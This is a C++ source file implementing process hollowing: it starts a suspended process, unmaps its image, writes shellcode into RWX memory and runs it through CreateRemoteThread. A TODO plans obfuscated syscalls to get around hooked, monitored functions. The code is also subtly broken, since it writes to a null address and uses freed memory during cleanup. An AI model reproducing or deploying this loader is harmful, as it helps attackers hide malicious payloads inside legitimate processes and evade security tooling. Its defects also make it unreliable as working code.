// Credit: https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp
// Credit: https://gist.github.com/benpturner/43b46506e4f98e5b860f72c3a6c42367

// TODO: Use obfuscated syscalls instead of most likely hooked functions like CreateRemoteThread

#include "process_hallowing.h"
#include "internal.h"
#include "pe.h"

bool InitializeHollowProcess(STARTUPINFOA *&pStartupInfo, PROCESS_INFORMATION *&pProcessInfo, PPEB &pPEB, PLOADED_IMAGE &pImage, char *targetPath) {
    PRINT("creating process", PRINT_INFO);
    pStartupInfo = new STARTUPINFOA();
    pProcessInfo = new PROCESS_INFORMATION();

    CreateProcessA(0, targetPath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);
    if (!pProcessInfo->hProcess) {
        PRINT("failed to create process", PRINT_ERROR);
        return false;
    }

    pPEB = ReadRemotePEB(pProcessInfo->hProcess);
    if (!pPEB) {
        PRINT("failed to read remote peb", PRINT_ERROR);
        return false;
    }

    pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
    if (!pImage) {
        PRINT("failed to read remote image", PRINT_ERROR);
        return false;
    }

    return true;
}

bool UnmapDestinationSection(HANDLE hProcess, PPEB pPEB) {
    PRINT("unmapping process memory", PRINT_INFO);
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

    auto NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
    DWORD dwResult = NtUnmapViewOfSection(
            hProcess,
            pPEB->ImageBaseAddress
    );

    if (dwResult) {
        PRINT("failed to unmap destination section", PRINT_ERROR);
        return false;
    }

    return true;
}

bool AllocateAndWriteMemory(HANDLE hProcess, const std::vector<BYTE> &shellcode, LPVOID *pAllocatedMemory) {
    PRINT("allocating and writing shellcode to the target process", PRINT_INFO);
    *pAllocatedMemory = VirtualAllocEx(hProcess, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(!*pAllocatedMemory) {
        PRINT("failed to allocate memory in the target process", PRINT_ERROR);
        return false;
    }

    if(!WriteProcessMemory(hProcess, nullptr, shellcode.data(), shellcode.size(), nullptr)) {
        PRINT("failed to write shellcode to the target process", PRINT_ERROR);
        return false;
    }

    return true;
}

void CreateHollowProcess(char *targetPath, const std::vector<BYTE> &shellcode) {
    if (targetPath == nullptr) {
        PRINT("target path is empty", PRINT_ERROR);
        return;
    }

    if (shellcode.empty()) {
        PRINT("shellcode vector is empty", PRINT_ERROR);
        return;
    }

    STARTUPINFOA *pStartupInfo = nullptr;
    PROCESS_INFORMATION *pProcessInfo = nullptr;
    PPEB pPEB = nullptr;
    PLOADED_IMAGE pImage = nullptr;
    LPVOID pAllocatedMemory = nullptr;
    HANDLE hRemoteThread = nullptr;

    if (!InitializeHollowProcess(pStartupInfo, pProcessInfo, pPEB, pImage, targetPath)) {
        goto cleanup;
    }

    if (!UnmapDestinationSection(pProcessInfo->hProcess, pPEB)) {
        goto cleanup;
    }

    if (!AllocateAndWriteMemory(pProcessInfo->hProcess, shellcode, &pAllocatedMemory)) {
        goto cleanup;
    }

    hRemoteThread = CreateRemoteThread(pProcessInfo->hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pAllocatedMemory, nullptr, 0, nullptr);
    if (hRemoteThread == nullptr) {
        PRINT("failed to create remote thread", PRINT_ERROR);
        goto cleanup;
    }

cleanup:
    if (pStartupInfo) {
        delete pStartupInfo;
    }
    if (pProcessInfo) {
        delete pProcessInfo;
    }
    if (pPEB) {
        delete pPEB;
    }
    if (pImage) {
        delete pImage;
    }
    if (pAllocatedMemory) {
        VirtualFreeEx(pProcessInfo->hProcess, pAllocatedMemory, 0, MEM_RELEASE);
    }
    if (hRemoteThread) {
        CloseHandle(hRemoteThread);
    }
}